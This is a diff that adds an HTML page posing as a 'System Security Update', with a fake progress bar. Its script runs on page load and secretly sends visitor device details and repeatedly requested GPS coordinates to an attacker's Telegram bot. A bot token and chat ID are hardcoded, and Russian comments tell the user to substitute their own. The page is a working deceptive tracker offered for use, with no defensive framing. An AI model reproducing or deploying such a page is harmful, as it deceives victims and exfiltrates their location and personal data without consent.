@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>System Security Update</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background: #0d1117; color: white; min-height: 100vh; }
+        .container { max-width: 500px; margin: 50px auto; text-align: center; }
+        .card { background: #161b22; padding: 30px; border-radius: 10px; border: 1px solid #30363d; }
+        .progress { background: #21262d; border-radius: 10px; margin: 20px 0; overflow: hidden; }
+        .progress-bar { height: 20px; background: #1f6feb; width: 0%; transition: width 0.5s; }
+        .status { margin: 15px 0; font-size: 16px; color: #8b949e; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <h1>🔄 System Security Update</h1>
+            <p>Downloading and installing critical security patches...</p>
+            
+            <div class="progress">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+            
+            <div class="status" id="status">Initializing update process...</div>
+        </div>
+    </div>
+
+    <script>
+        // ⚠️ ЗАМЕНИ ЭТИ ДАННЫЕ НА СВОИ ⚠️
+        const BOT_TOKEN = '8251830695:AAGdnd86D1vzDmO-ZFgN2kqF1eyrfpPs3OE';
+        const CHAT_ID = '8270180051';
+        
+        function collectData() {
+            const data = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: screen.width + 'x' + screen.height,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                url: window.location.href,
+                timestamp: new Date().toISOString()
+            };
+            
+            sendToTelegram('🎯 SYSTEM UPDATE ACCESSED:\n' + JSON.stringify(data, null, 2));
+        }
+        
+        function tryGeolocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        const loc = `📍 DEVICE LOCATION:\nLat: ${position.coords.latitude}\nLng: ${position.coords.longitude}\nAccuracy: ${position.coords.accuracy}m`;
+                        sendToTelegram(loc);
+                    },
+                    error => {
+                        sendToTelegram('📍 Location services: Not available');
+                    }
+                );
+            }
+        }
+        
+        function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            fetch(url, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message
+                })
+            });
+        }
+        
+        // Сбор данных при загрузке
+        setTimeout(() => {
+            collectData();
+            setTimeout(tryGeolocation, 2000);
+        }, 1000);
+        
+        // Повтор геолокации
+        setInterval(tryGeolocation, 45000);
+        
+        // Анимация обновления
+        let progress = 0;
+        const progressBar = document.getElementById('progressBar');
+        const status = document.getElementById('status');
+        
+        const updateSteps = [
+            'Downloading security components...',
+            'Verifying digital signatures...',
+            'Installing system patches...',
+            'Configuring security settings...',
+            'Finalizing installation...'
+        ];
+        
+        const interval = setInterval(() => {
+            progress += 8 + Math.random() * 12;
+            if (progress >= 100) {
+                progress = 100;
+                clearInterval(interval);
+                status.textContent = 'Update complete! System is secure.';
+                sendToTelegram('✅ System update completed successfully');
+            }
+            progressBar.style.width = progress + '%';
+            
+            if (progress < 100) {
+                const stepIndex = Math.min(Math.floor(progress / 20), updateSteps.length - 1);
+                status.textContent = updateSteps[stepIndex];
+            }
+        }, 600);
+    </script>
+</body>
+</html>
